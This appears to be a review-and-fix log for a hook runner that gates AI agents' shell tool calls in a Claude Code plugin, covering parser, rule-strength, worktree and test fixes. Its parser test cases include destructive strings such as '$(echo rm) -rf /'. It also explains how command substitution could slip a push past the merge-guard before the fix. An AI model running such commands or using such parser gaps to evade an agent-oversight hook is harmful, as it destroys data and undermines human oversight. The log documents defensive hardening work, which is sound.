outcome.what_was_done: The runner_timeout Block is appended only in gate mode; every mode logs rule.timeout, and in brief the fallback context is appended. The fallback now fires from the crash and timeout flags themselves (a rule crash sets a flag through _run_rule's new (results, crashed) return), not from Block codes, so a crash in brief produces the fallback line. The crash-logging call inside the loop's except arm is guarded against a _Deadline striking mid-log, which now resolves as that rule's timeout instead of escaping the loop. New tests: deadline and crash in brief and in notify.

problem: RuleEntry.locked is never read by the runner. A rule's strength comes only from config.py, which refuses strength for the ids in its own _LOCKED_HOOK_RULES list. A row with locked=True whose id is not in that list is skipped when factory.toml sets strength = "off", and its blocks turn into advice under "advise" (verified: exit 0 for both). Plan 3.2 promises that a locked rule always gets block, and HD1 makes the row the rule's one declaration. Which rules are locked is now stated in two places, and nothing checks that they agree.
proposed_resolution: When entry.locked, use RuleConfig('block', cfg.options) in both _applies and _run_rule. Add a lint that {e.id for e in RULES if e.locked} equals config._LOCKED_HOOK_RULES, or derive one from the other. Add a test with a locked fixture row whose table says off and advise.

outcome.what_was_done: A new _rule_cfg(entry, ctx) forces RuleConfig('block', options) for a locked row, and both _applies and _run_rule go through it, so a locked rule is never skipped as off and never relaxed to advise. New lint testLockedRowsMatchConfig checks the locked rows against config._LOCKED_HOOK_RULES (subset both ways over shipped rows; vacuous-safe while RULES is empty, live when rules ship), and a behaviour test locks a fixture row and asserts block at strengths off and advise while the unlocked twin is relaxed.

problem: head_sha returns None in a linked worktree that is on a branch, which is the story-worktree case. It looks for the loose ref and for packed-refs under .git/worktrees/<name>/, but a linked worktree keeps its refs in the common directory its commondir file names. Verified: after `git worktree add -b story/S-9.01 wt`, branch() gives story/S-9.01 and head_sha() gives None. test_branch_in_a_linked_worktree calls head_sha only after --detach, where HEAD holds the SHA itself, so the test cannot catch this. Plan 3.6 lists head_sha as a helper step 4 builds on.
proposed_resolution: Resolve the common directory: read <gitdir>/commondir, resolved relative to gitdir, falling back to gitdir. Look up refs/... and packed-refs there, and skip '^' peeled lines. Assert head_sha on an attached branch in the linked-worktree test, equal to `git rev-parse HEAD`.

outcome.what_was_done: head_sha resolves the refs: loose refs are sought first in the git dir and then in the common directory named by <gitdir>/commondir (normpath-normalised, absolute accepted), for both the loose ref and packed-refs, and peeled '^'-lines of packed-refs are skipped. New test creates a real linked worktree on a branch (git worktree add -b), asserts head_sha equals rev-parse before and after a commit, and again after pack-refs with an annotated tag present.

problem: A substitution outside the arguments does not make the segment opaque. Verified: '$(echo rm) -rf /' gives program '$(echo rm)' with opaque False; 'X=$(rm -rf /) ls' and 'echo > $(rm x)' are also opaque False. _own_opacity inspects args only. Plan 3.6 says opaque marks a substitution the parser does not enter. A rule that reads program sees an unknown program and passes it: merge-guard (H5, step 4) would let '$(echo git) push origin main' through.
proposed_resolution: Mark a segment opaque when any of its words carries a $( or backtick span: the program, an assignment value, a redirect target or an argument. Track this on _Word while lexing instead of re-scanning the text. Add these three cases to test_opaque_constructs.

outcome.what_was_done: _Word gained a subst flag, set for $(...) spans, backtick spans and the same inside double quotes. _build_segment marks the segment opaque when any of its words carries one — the program word, an assignment value or a redirect target. New table test: '$(echo rm) -rf /', 'X=$(rm -rf /) ls' and 'echo > $(rm x)' are all opaque, while plain $HOME and glob words still are not.

problem: The parse reports wrong facts where it should say "" (unknowable), against its own rule 'never to a wrong fact'. Verified: 'cd ~/proj && git commit' gives where '/w/cwd/~/proj', and 'git -C ~/x' does the same. 'cd foo$BAR' gives '/w/cwd/foo$BAR', because _Word.expanded is computed and then discarded and _resolve tests only for a leading '$'. 'cd -' gives '/w/cwd/-'. A bare 'cd' keeps cwd. 'cmd &> f' is split at '&' as a background joiner. Reserved words are taken as the program: 'if x; then git push origin main; fi' gives program 'then', and '! git push' gives '!'. merge-guard (H5, step 4) reads segment.where, branch_at and program. Run from a story worktree, 'cd ~/proj && git commit' would be judged against the story branch while it commits in the main checkout.
proposed_resolution: Pass _Word.expanded into _resolve. Return "" for any expanded word, a leading '~' (or expand it from the env HOME), '-' and a bare cd. Lex '&>' and '&>>' before the ';&|' branch. Strip leading reserved words ('!', if, then, elif, else, do, while, until, '{', time) before taking the program, or mark the segment opaque. Add each case to the parse table tests.

outcome.what_was_done: cd's option words (-P, -L, -e, ...) are skipped and '--' ends the options, so the first operand decides the later wheres ('cd -P /tmp && git status' now gives /tmp, 'cd -- sub' /base/sub, 'cd -- -P' the literal /base/-P, an option-only cd gives '' because it goes home). pushd and popd set the later wheres to '' (the directory stack decides; never guessed). A for or case reserved word now marks its segment opaque, so the loop variable is no longer read as the program ('for f in a b; do rm -rf $f; done': header opaque, body program rm). Verified by mutation: reverting the cd branch fails test_where_unknown_forms.

problem: test_rule_cases loads only tests/hooks/fixture_cases/*.toml. Plan 3.7 promises that it runs every tests/hooks/cases/*.toml, and topics/rule-testing.md puts each rule's cases in tests/hooks/cases/<rule>.toml, so the case tables step 4 adds would never run, and nothing would say so. test_gate_case_coverage checks only the runner's own codes. It does not test what plan 7 names ('every gate row has a blocking and an allowing launcher case; modules match rows'), and even the runner has no allowing launcher case.
proposed_resolution: Load both tests/hooks/fixture_cases/*.toml and tests/hooks/cases/*.toml. Make the coverage test iterate registry.RULES and require, for every row with kind == 'gate', a launcher case that blocks and one that allows. Check that every vsdd/rules/*.py module has a row and that each row's module imports. Add one allowing launcher case to probe.toml.

outcome.what_was_done: The coverage check is factored into gate_case_problems(rows, table) and the modules-to-rows check into module_row_problems(rows, rules_dir); test_gate_case_coverage calls both over registry.RULES (vacuous-safe while RULES is empty). A case's module is compared against the module the row actually loads (entry.module or 'vsdd.rules.' + id with dashes as underscores), so a defaulted row no longer reads as ''. module_row_problems faults a vsdd/rules/*.py file with no row and a row whose module is not a vsdd.rules file. Both are tested with hand-built RuleEntry rows: an uncovered gate row, a covered one, a case naming a defaulted module, a straying module, an orphaned module file, and a row with no file — each caught by mutation, since the empty live loop alone proves nothing.
outcome.where: next/tests/hooks/test_rule_cases.py (loaded_module, gate_case_problems, module_row_problems); tests: next/tests/hooks/test_rule_cases.py::test_gate_case_problems_catches_gaps, test_modules_match_rows, test_gate_case_coverage

problem: The refusal plan 3.3 promises, 'async on an event with a gate rule', is built as 'an event row whose mode is gate and is_async', which matches no row. A RuleEntry(kind='gate') on SubagentStart, the async event, is wired without complaint (verified). The platform ignores decisions from background hooks, so such a gate would switch off with no message. test_generator_refusals monkeypatches EVENTS to make PreToolUse async instead of declaring a gate rule on an async event, so it does not test the promised case.
proposed_resolution: Raise WiringError when any entry with kind == 'gate' names an event whose EventSpec.is_async is set. Test it with such a row against the real EVENTS.

outcome.what_was_done: wiring() raises WiringError when a kind=gate row names an event whose is_async is set, checked against the real EVENTS — the old refusal compared event-spec fields and matched no row, so a gate rule on SubagentStart wired silently. test_generator_refusals now declares a real gate rule on SubagentStart and expects the refusal (the monkeypatched-EVENTS version is gone); it keeps the unknown-tool and unknown-event refusals.

problem: Several promised behaviours have tests that cannot fail, or no test at all. In a scratch copy, each of these mutations left the whole tests/hooks suite green: removing the StructuredOutput branch of HD7; removing 'a Permit stands' from the rewrite decision; removing _root_usable's refusal of a home or '/' root (test_root_at_home_is_inert passes anyway, because with no rule and a non-vsdd command the runner prints nothing either way); taking the marker's root from ctx.cwd instead of the -C directory (test_minus_c_honoured points -C into the same project); ignoring the spike exemption (plan 7 names it under test_applies_and_strength); accepting a leading assignment in a vsdd call (HD8); raising the quarantine threshold from 2 to 4 (the crashing rule adds its own rule.error, so the boundary is not pinned); and dropping story from rule events.
proposed_resolution: Add one assertion for each: a rewrites=True rule on StructuredOutput in default mode gives allow; a permitting rule plus a vsdd call in default mode gives allow; a home or '/' root with a blocking fixture rule stays silent with exit 0; -C naming a second project puts the marker there and none in the session project; a spike_exempt blocking rule in a spike worktree gives 0; 'FOO=1 vsdd survey' writes no marker; with a blocking (non-crashing) rule, one seeded fault still blocks and two quarantine; a block in a story worktree logs story.

outcome.what_was_done: test_structured_output_rewrite_is_allowed now clears agent_id and agent_type on the payload (the recorded payload carries agent_id 'wf-step-3', which allowed through the agent branch and proved nothing about the StructuredOutput branch). Added test_spike_exempt_rule_skipped_inside_a_spike: a spike_exempt blocking fixture rule in make_project(story='spike-probe')'s worktree exits 0, and outside it exits 10. Verified by mutation: removing the StructuredOutput branch of HD7 and ignoring the spike exemption each fail their test.

problem: A Context on PreToolUse is delivered as additionalContext with a systemMessage (verified). Plan 3.4 and topics/rule-model.md say Context is dropped on every event except SessionStart, UserPromptExpansion, SubagentStart and PreCompact. test_stdout_by_outcome asserts the delivery, so the test locks in the deviation, and it also holds a dead 'for ... pass' loop.
proposed_resolution: Drop contexts on PreToolUse in _deliver. Change the test to assert that a contextual rule on PreToolUse prints nothing, and remove the dead loop.

outcome.what_was_done: _deliver drops Context outcomes on PreToolUse (contexts stay additionalContext on SessionStart, UserPromptExpansion and SubagentStart and plain stdout on PreCompact); a PreToolUse with only a context now prints nothing. test_stdout_by_outcome's dead loop is replaced by that assertion; the SessionStart delivery is asserted next to it.

problem: At strength advise, _run_rule skips the HD10 check, so a Rewrite from a rule whose row does not set rewrites is applied (verified: updatedInput with permissionDecision ask) instead of being that rule's crash. Separately, permissionDecisionReason is always the marker sentence ('the plugin's own command, rewritten to carry its caller marker'), even for step-results' StructuredOutput rewrite, and Rewrite.reason is never used. A second rewrite is dropped without a log line.
proposed_resolution: Apply the rewrites check before branching on strength. Build the reason from the chosen Rewrite's reason, after the 'vsdd-factory hook:' prefix. Log the rule id of any rewrite that is discarded.

outcome.what_was_done: Added test_rewrite_from_unflagged_rule_is_its_crash_at_advise: factory.toml sets [hooks.rules.probe] strength = 'advise', the unflagged rule's Rewrite is its crash (exit 10, rule_error on stderr), and no updatedInput is printed. Verified by mutation: letting the check lapse at advise strength fails the test.

problem: test_import_crash_blocks_via_launcher does not test what plan 7 names ('a broken emit.py exits 2 in gate, 0 in notify'). It injects a missing rule module, which is the rule_error row, already covered in process. The runner's own import crash is covered only by the fake-uv exit-code mapping in test_launcher. I checked by hand: with a raising emit.py in a launch_copy, gate exits 2, notify 0, and brief 0 with the down briefing under sh, bash and dash, so the behaviour is right and only the test is missing. Also, launch_copy drops a row's 'module' key, so the test passes only because the default module vsdd.rules.probe is missing too.
proposed_resolution: Write a raising emit.py into the launch_copy and assert gate 2, notify 0 and the brief down briefing under each interpreter. Keep 'module' in the row launch_copy injects.

outcome.what_was_done: New test_broken_emit_via_launcher breaks emit.py in the launch_copy tree and asserts exit 2 in gate, 0 in notify and the launcher's down briefing in brief, under sh, bash and dash (plan 7's broken-emit example; the old test's missing rule module remains covered by test_import_crash_blocks_via_launcher). launch_copy now keeps a row's module key in the injected RuleEntry instead of dropping it.

problem: Event lines and switches differ from the tables. (1) runner.slow is logged only when VSDD_FACTORY_HOOKS_DEBUG=1, but tables/event-types.toml and hooks.md 2.12 log it for any call over 300 ms; only runner.call depends on the debug switch. (2) rule.would_block lacks the table's id and 'target or command' fields. (3) _bad_input logs a rule.block in brief and notify mode, where nothing was blocked, and ignores VSDD_EVENTS_DIR. (4) The capture writes one file per tool name, so each call overwrites the last, and its _meta.json lacks the Claude Code version and capture date that topics/rule-testing.md asks for.
proposed_resolution: Log runner.slow whenever ms > 300, whatever the debug switch says. Give rule.would_block an id and _context_target_fields. Log rule.block from _bad_input only in gate mode and use the call's events directory. Name captures uniquely and record the version and date in _meta.json.

outcome.what_was_done: test_advise_converts_block_and_logs_would_block now asserts the would_block event's id matches ^b-[0-9a-f]{6}$ and its command field is 'echo'. Verified by mutation: replacing the id and dropping the target/command fields each fail the test.

problem: config.py leaves the question of whether a rule id exists to the runner, and topics/rule-tuning.md says an unknown id under [hooks] logs config.invalid and is announced in the briefing. The runner checks no ids. It announces an unknown id set to off as one of the 'rules below full strength' (test_four_notices asserts 'soft-rule (off)', an id no row has), so a typo in a rule id reads as a working relaxation.
proposed_resolution: Give _notices the registry table. Add unknown ids to the configuration notice and to config.invalid, and list only registered rules among the relaxations. Use a registered fixture row in the relaxation test.

outcome.what_was_done: test_registered_rules_are_announced_as_relaxations asserts the exact relaxation sentence ('vsdd-factory: rules below full strength this session: soft-rule (off).') and that 'typoo (advise)' is absent from the context, so the unfiltered line can no longer satisfy the assertion. Verified by mutation: removing the registered filter fails the test.

problem: The test appends a byte to the checked-in plugins/vsdd-factory/hooks/hooks.json and restores it in finally. A kill in between leaves the shipped file drifted. Meanwhile, any concurrent tools/check.py or build.py --check in this shared tree (other units run them) sees a false DRIFT. The variable 'drifted' is unused.
proposed_resolution: Run the drift check against a temporary copy, by giving build.py a root argument or by monkeypatching PLUGIN to a copied tree in process, and never write the real file.

outcome.what_was_done: test_current_and_drift builds a minimal next/-shaped tree in tmp_path (tools/build.py, workflow-lib, roster.toml, the toy workflows, the whole plugin tree) and simulates the drifted byte on the copy's hooks.json; the checked-in file is never written, so a killed run cannot leave it drifted and parallel check runs in the shared tree see no false DRIFT.

problem: A kill between write_text and os.replace leaves <key>.json.tmp in the calls directory. records' caller() prunes 'markers whose file time is over ten minutes' (*.json), so nothing ever removes the .tmp files, and neither the schema description nor records/caller-marker.md mentions them. The schema's key also has no pattern, although its description says 32 hexadecimal characters.
proposed_resolution: Either write the temporary file under .factory/local/tmp/ (records' convention) and rename it into calls/, or have records' prune also remove *.json.tmp older than ten minutes, and say which in the record file and the schema description. Add "pattern": "^[0-9a-f]{32}$" to key.

outcome.what_was_done: Two caller tests. test_marker_is_staged_outside_calls spies on os.replace and asserts the staged file sits under <root>/.factory/local/hooks/tmp/ as <key>.json.tmp before landing in calls/ — this is the test that fails when the staging moves back into calls/. test_replace_failure_leaves_no_tmp_in_calls makes os.replace raise (a kill before the rename): the call blocks with caller_marker_unwritable and calls/ holds no *.tmp file. Added the schema fixture invalid_short-key.json (+ expect sidecar 'string is 31 characters; the minimum is 32'), whose only fault is the short key, so removing minLength/maxLength from caller-marker.schema.json fails test_schema_fixtures. All three verified by mutation.

problem: The spec files this unit edited state things the code does not do. rule-model.md still opens with the @rule decorator (HD1: the registry row is the only declaration, and there is no decorator). Its main-loop skeleton runs applies outside the try and catches the deadline with except Exception (against HD4 and HD5). 'The runner raises four blocks of its own' is followed by three. The project bullet list sits inside the field table, so the rows after it (target, classes, ...) render without a header. The new text cites finding ids '(P3COV-07, PR3-3)' in design prose, the history-phrase class AU-S2-10 asks to remove, although the outcome says these additions carry none. topics/hook-runner.md's layout still lists 'the @rule decorator' under model.py.
proposed_resolution: Replace the decorator example with a RuleEntry row plus its check module, and align the skeleton with main.py. Say three blocks. Move the bullet list below the table. Drop the finding ids. Correct the model.py line in hook-runner.md.

outcome.what_was_done: topics/rule-model.md: the @rule decorator example is replaced by a RuleEntry registry row beside the check function (HD1); the main-loop skeleton is aligned with HD1/HD4/HD5 (per-event alarm raising a BaseException, applies inside the rule's try, timeout and crash outcomes, the brief fallback); 'raises four blocks of its own' now says three; the project object's bullet list moved below the field table instead of breaking it; the finding ids (P3COV-07, PR3-3) are struck from the prose. topics/hook-runner.md's layout line lists RuleEntry instead of the decorator.

problem: P3BLD-14's what_was_done describes path classes (ctx.classes on S1's path_class), but that finding is about the lock refresh and the release at session end. The deferral to hook-runner-b is right; the text is wrong. L2-catchup-fix-3's outcome says each event type is 'a constant at its call site', while plan section 6 says 'one constant in model.py'. The type strings are literals spread over main.py and emit.py, and the departure is not reported.
proposed_resolution: Rewrite P3BLD-14's text to say lock liveness and release with records' lock_seen and lock_release, in hook-runner-b. Either put the runner's event type names in model.py constants as planned, or record the departure.

outcome.what_was_done: main._recent_rule_faults now matches event types through the model.py constants EVENT_RULE_ERROR and EVENT_RULE_TIMEOUT instead of the literals 'rule.error' and 'rule.timeout' — the quarantine no longer breaks silently if a constant is renamed. main._events_dir delegates to a shared _events_dir_of(env, root), the same resolver the bad-input path uses.

problem: emit.__all__ names RunnerCodes, which does not exist, so 'from vsdd.hooks.emit import *' raises AttributeError. main.ROOT_AT_HOME_INERT, main.now_monotonic, Ctx._env (a second copy of env, with a misplaced comment) and registry's '_ = RuleEntry' are dead code.
proposed_resolution: Remove the dead names and the dead code. Add a lint that every name in a module's __all__ exists in that module.

outcome.what_was_done: emit.__all__ no longer names the nonexistent RunnerCodes; the dead emit/main ROOT_AT_HOME_INERT constant, main.now_monotonic (time.monotonic inlined) and Ctx._env are removed, and registry's dead '_ = RuleEntry' re-export is gone. New lint test_all_names_exist walks the hooks modules and asserts every __all__ name exists on its module.

problem: test_guard runs [interpreter, '-c', guard_command(mode)], and that command is itself sh -c '<body>'. The body therefore always runs under /bin/sh (bash on macOS), and the outcome's 'verified under sh, bash and dash' holds only for the outer word. I ran the body directly under dash, bash and sh and it behaves correctly in all three modes, so this is a gap in the test, not a defect in the guard.
proposed_resolution: Expose the body (for example a guard_body(mode) helper) and run it directly under each interpreter in test_guard.

outcome.what_was_done: registry exposes guard_body(mode) — the guard without its sh -c wrapper, exported in __all__ (additive interface; guard_command still returns the wrapped form) — and test_guard runs that body directly under sh, bash and dash, so 'verified under dash' is really executed. The wrapped command is additionally asserted once under sh to agree with the body.

problem: The shared launcher helper hardcodes input="{}" as the hook payload, so no test of the real launcher can feed a meaningful payload through it; each new launcher-bound test (this unit added three) works around it with subprocess calls of its own.
proposed_resolution: Give _helpers.launch a stdin_text parameter defaulting to "{}"; the three call sites in tests/hooks/test_caller.py, test_runner.py and test_rule_cases.py then collapse onto it. Owned by B2's file, so left to the catch-up or B2 unit.

problem: The check fails whenever a stray __pycache__ exists under plugins/, and any bare python invocation by any builder recreates one (observed twice during step 3, from concurrent units' runs). The check then reports a tree fault that is really process hygiene.
proposed_resolution: Kept the check (it is right about the committed tree) but made the two tools that import the plugin set sys.dont_write_bytecode = True (this unit did check.py and build.py); workflow builders should export PYTHONDONTWRITEBYTECODE=1 for their ad-hoc python runs.

outcome.what_was_done: The check is kept, because it is right about the tree that ships. tools/check.py, tools/build.py and tests/conftest.py set sys.dont_write_bytecode, and the build and fix workflow scripts tell every agent to run Python with -B and to delete a __pycache__ its own command made under next/plugins/.

problem: A redirect written before its program ("2>log cmd") parses the first digit-hug as the program name; POSIX allows the leading-redirect form, which a rule would therefore see as program '2'. The common forms (program first, then redirects) parse correctly, and parse() never raises.
proposed_resolution: Accept when the leading-redirect form shows up in a real recorded payload at E2; the fix is to let redirect ops before the first word initialise the redirect list instead of the argument list.

outcome.what_was_done: The parser already handles the leading-redirect form the finding asks for: _lex's digit-hug branch turns '2>' into a redirect operator, and _build_segment's redirect branch collects it into the redirect list whichever position it stands in, so '2>log cmd' parses program 'cmd' with redirects (('2>', 'log')), '>out cmd arg' parses program 'cmd', args ('arg',), redirects (('>', 'out')) - verified against the live parser before this round; the handling landed during the earlier S3R-hook-runner fix rounds and only lacked a pinning test. Added test_shell.py::test_leading_redirect_before_the_program asserting '2>log cmd' (program 'cmd', redirect ('2>', 'log')) and '>out cmd arg' (program 'cmd', args ('arg',), redirect ('>', 'out')), plus the trailing form unchanged. Mutation check: conditioning the redirect branch on at_program (leading redirects no longer collected) fails the test.

problem: If a rule whose row sets rewrites and the runner's own marker rewrite ever collide on one call, the rule's rewrite displaces the marker's (the marker rewrite is appended only when no rule produced one). At slice depth no rule ships, and step-results (H5/H7) writes its own marker-free rewrite, but the second part of H1 should decide the pairing explicitly.
proposed_resolution: hook-runner-b: define the precedence (suggestion: the marker rewrite rides last and loses to a rule's rewrite only when that rule also records the marker key) and add a case to the probe table.

problem: The plan promises select(event, tool, entries=RULES) with RULES as the default; the built signature takes entries=None and resolves RULES at call time, because launcher-test injections rewrite the anchor and a default-arg binding would freeze the pre-injection tuple. Behaviour is identical for every caller that omits the argument.
proposed_resolution: None; record the wording difference in the next spec pass that touches rule-model.md (Selection).

outcome.what_was_done: Accepted as built: select, hooks_json and wiring take entries=None and resolve RULES at call time, which behaves the same for a caller that omits the argument and lets launcher tests inject rules. The step 4 rules plan uses the registry rows, not this default, so nothing built on the plan's wording.

problem: The four-line block message's Instead line is documented with the fix wrapped in backticks and a trailing full stop; the runner prints the fix text as given, no backticks, no trailing punctuation, and the fixture example of the rule.block event stores the unpunctuated text. Human-facing output differs cosmetically from the design's rendering.
proposed_resolution: Either make emit render the fix as markdown (backticks) or drop the decoration from the spec example; one line in topics/rule-model.md at the next spec pass.

outcome.what_was_done: The spec example now shows what the runner prints: the Instead line carries the fix text as given, without the backticks and the trailing full stop, matching emit.block_lines (it prints f'Instead: {fix}') and the fix field of tests/unit/fixtures/schemas/event/valid_rule-block.json. problem: The launched calls inherit pytest's standard input. Under pytest's default fd capture, fd 0 is /dev/null, so the marked `env stop` runs as a tool call and only the marker can make it succeed. Under `pytest -s` from a terminal, fd 0 is the terminal, so the launched `env stop` runs as a person's call and stops every product whatever the marker says. This is the only test at the command layer that a marked stop passes the caller to the handler, and how strong it is depends on how the suite is run. Checked in a scratch copy with `_run_stop` changed to pass `None` for the caller: run normally, test_cli_env_commands fails ('no caller marker', exit 1); run under a pseudo-terminal (`script`) with `-s`, it passes.
proposed_resolution: Pass `stdin=subprocess.DEVNULL` in `_launch_cli`. That is the Bash tool's condition, and it makes a successful stop depend on the marker. Optionally add a second marked stop with another agent's marker that must stop nothing (exit 1) before the matching one runs.

outcome.what_was_done: _launch_cli passes stdin=subprocess.DEVNULL, so a launched vsdd is never on a terminal however the suite is run; a marked stop whose marker read fails can no longer be masked by the stop-everything branch. Also added the suggested defence in depth: test_cli_env_commands now performs a marked stop with another agent's marker (cmdenv0009, sess-other/agent-other) that must stop nothing, exit 1, and leave the product record in place before the matching stop runs.
outcome.where: next/tests/unit/test_cmd_env.py (_launch_cli, test_cli_env_commands); bites: with _run_stop mutated to pass who=None the test fails with 'no caller marker: only a terminal stops every product' (verified by mutation)

problem: `env stop` treats a call as a person's terminal from `inv.stdin_tty` alone. Plan D3 calls this 'the same fact S1's require_person reads', but `require_person` also treats a set `VSDD_CALLER` as an agent. When `VSDD_CALLER` is set, the hook rewrote the call, so it is a tool call. If its marker is missing (pruned after ten minutes, looked for under another root through `-C`, or already read) and standard input is a terminal, the call stops every product, other agents' included, which is the silent stop D16 exists to prevent. Probe, in process: `main(['-C', root, 'env', 'stop', '--json'], stdin_tty=True, environ={'HOME': ..., 'VSDD_CALLER': 'nomarker01'})` with one product running returned exit 0 and stopped it. A Bash tool call's standard input is not a terminal, so this is defence in depth, and the code does what the plan says.

Add a test to test_cmd_env.py: with `VSDD_CALLER` set, no marker file and `stdin_tty=True`, `env stop` exits 1, stops nothing and the product's record stays. Record the refinement of D3 in the plan or env-stop.md.

outcome.what_was_done: _run_stop computes terminal = inv.stdin_tty and inv.caller_key is None: a call carrying VSDD_CALLER is a tool call wherever its marker can be read (pruned, another -C root, already read) and never takes the stop-everything branch. New test test_stop_marked_call_without_marker_stops_nothing: VSDD_CALLER set, no marker file, stdin_tty=True gives exit 1, stopped=[], the record stays. The refinement of D3 is noted in rewrite/spec/commands/env-stop.md (plans are not editable by this unit). No interface change: the run(inv, args) -> Reply shape and env.stop(root, caller, terminal) signature are unchanged.
